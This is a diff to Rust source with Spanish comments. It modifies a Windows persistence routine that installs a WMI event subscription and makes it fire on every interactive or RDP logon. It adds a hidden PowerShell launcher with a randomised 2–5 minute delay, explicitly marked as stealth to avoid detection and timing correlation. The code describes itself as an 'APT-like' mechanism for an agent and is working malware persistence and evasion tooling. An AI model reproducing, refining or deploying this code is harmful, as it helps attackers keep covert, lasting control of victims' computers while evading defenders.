@@ -399,7 +399,9 @@ fn persist_scheduled_task(exe_path: &Path) -> Result<String, String> {
 }
 
 /// Implementa persistencia mediante WMI Event Subscription (APT-like)
-/// CORREGIDO: Usa evento de inicio de sistema que se dispara después del boot
+/// CORREGIDO: Usa __InstanceCreationEvent con Win32_LogonSession que se dispara
+/// cada vez que un usuario inicia sesión (incluyendo después de reinicio)
+/// STEALTH: Incluye delay aleatorio de 2-5 minutos para evitar detección
 #[cfg(target_os = "windows")]
 fn persist_wmi_event(exe_path: &Path) -> Result<String, String> {
     let exe_str = exe_path.to_str()
@@ -414,17 +416,37 @@ fn persist_wmi_event(exe_path: &Path) -> Result<String, String> {
     let pid = std::process::id() as usize;
     let event_name = event_names[pid % event_names.len()];
     
-    // Comando que ejecuta el exe directamente (sin -File que es para .ps1)
-    // Usar cmd.exe /c start para ejecutar en segundo plano
-    let obfuscated_cmd = format!("cmd.exe /c start /min \"\" \"{}\"", exe_str);
+    // STEALTH: Generar delay aleatorio entre 120-300 segundos (2-5 minutos)
+    // Usamos el PID como seed para variar entre instalaciones
+    let delay_seconds = 120 + (pid % 181); // 120 + (0-180) = 120-300 segundos
     
-    // WMI Event que se dispara poco después del inicio del sistema
-    // Usamos Win32_PerfFormattedData_PerfOS_System.SystemUpTime para detectar
-    // cuando el sistema lleva entre 60-300 segundos arriba (1-5 minutos después del boot).
-    // El WITHIN 60 significa que WMI verifica la condición cada 60 segundos.
+    // Escapar la ruta del exe para PowerShell (reemplazar ' por '')
+    let escaped_exe = exe_str.replace('\'', "''");
+    
+    // Comando con delay usando PowerShell Start-Sleep antes de ejecutar
+    // Esto hace que el agente no se inicie inmediatamente después del logon
+    // sino que espere un tiempo aleatorio, evitando correlación temporal
     // 
-    // CORREGIDO: No usar Hour = 12 que solo funcionaba al mediodía
-    // Ahora detectamos el boot observando SystemUpTime en el rango correcto.
+    // El comando usa PowerShell oculto para:
+    // 1. Esperar el delay aleatorio
+    // 2. Ejecutar el agente en segundo plano
+    let obfuscated_cmd = format!(
+        "powershell.exe -WindowStyle Hidden -Command \"Start-Sleep -Seconds {}; Start-Process -WindowStyle Hidden -FilePath '{}'\"",
+        delay_seconds, escaped_exe
+    );
+    
+    // WMI Event que se dispara cuando se crea una sesión de inicio de sesión
+    // Usamos __InstanceCreationEvent con Win32_LogonSession que es MUCHO más confiable
+    // que intentar detectar SystemUpTime en un rango específico.
+    // 
+    // Win32_LogonSession se crea cuando:
+    // - Un usuario inicia sesión interactivamente (después de reinicio)
+    // - Un usuario se conecta por RDP
+    // - Un servicio inicia con credenciales específicas
+    // 
+    // LogonType = 2 significa Interactive logon (consola local)
+    // LogonType = 10 significa RemoteInteractive (RDP)
+    // Esto garantiza que se ejecute después de cada reinicio cuando el usuario inicia sesión.
     
     // PowerShell script para crear WMI Event Subscription
     // Primero limpia subscripciones existentes con el mismo nombre, luego crea nuevas
@@ -446,17 +468,20 @@ fn persist_wmi_event(exe_path: &Path) -> Result<String, String> {
                     "-ErrorAction SilentlyContinue | Where-Object {{ $_.Filter -like \"*$FilterName*\" }}; ",
                 "if ($existingB) {{ $existingB | Remove-WmiObject -ErrorAction SilentlyContinue }} ",
             "}} catch {{}}; ",
-            // Crear Event Filter - dispara cuando SystemUpTime está entre 60-300 segundos
-            "$Query = 'SELECT * FROM __InstanceModificationEvent WITHIN 60 ",
-                "WHERE TargetInstance ISA ''Win32_PerfFormattedData_PerfOS_System'' ",
-                "AND TargetInstance.SystemUpTime >= 60 AND TargetInstance.SystemUpTime <= 300'; ",
+            // Crear Event Filter - dispara cuando se crea una sesión de logon interactivo
+            // __InstanceCreationEvent es más confiable que __InstanceModificationEvent para este caso
+            // LogonType 2 = Interactive, 10 = RemoteInteractive (RDP)
+            // WITHIN 60 = polling cada 60 segundos (suficiente para eventos de logon poco frecuentes)
+            "$Query = 'SELECT * FROM __InstanceCreationEvent WITHIN 60 ",
+                "WHERE TargetInstance ISA ''Win32_LogonSession'' ",
+                "AND (TargetInstance.LogonType = 2 OR TargetInstance.LogonType = 10)'; ",
             "$Filter = ([wmiclass]'\\\\.\\root\\subscription:__EventFilter').CreateInstance(); ",
             "$Filter.Name = $FilterName; ",
             "$Filter.EventNamespace = 'root\\cimv2'; ",
             "$Filter.QueryLanguage = 'WQL'; ",
             "$Filter.Query = $Query; ",
             "$Filter.Put() | Out-Null; ",
-            // Crear Consumer - ejecuta el comando
+            // Crear Consumer - ejecuta el comando con delay
             "$Consumer = ([wmiclass]'\\\\.\\root\\subscription:CommandLineEventConsumer').CreateInstance(); ",
             "$Consumer.Name = $ConsumerName; ",
             "$Consumer.CommandLineTemplate = $ExePath; ",
@@ -483,7 +508,7 @@ fn persist_wmi_event(exe_path: &Path) -> Result<String, String> {
         .map_err(|e| format!("Error ejecutando PowerShell: {}", e))?;
     
     if output.status.success() {
-        Ok(format!("Persistencia WMI Event establecida: {}", event_name))
+        Ok(format!("Persistencia WMI Event establecida: {} (delay: {}s)", event_name, delay_seconds))
     } else {
         let stderr = String::from_utf8_lossy(&output.stderr);
         Err(format!("Error en WMI: {}", stderr))
